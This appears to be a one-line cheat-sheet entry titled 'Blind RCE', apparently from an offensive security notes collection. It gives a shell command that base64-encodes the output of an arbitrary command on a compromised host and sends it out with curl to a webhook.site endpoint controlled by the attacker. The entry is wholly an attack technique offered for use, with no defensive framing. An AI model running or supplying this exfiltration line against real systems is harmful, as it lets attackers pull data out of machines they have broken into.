# Blind RCE

Sends result as POST request:
```sh
<command> | base64 | curl -d @- https://webhook.site/<your_webhook_id>
```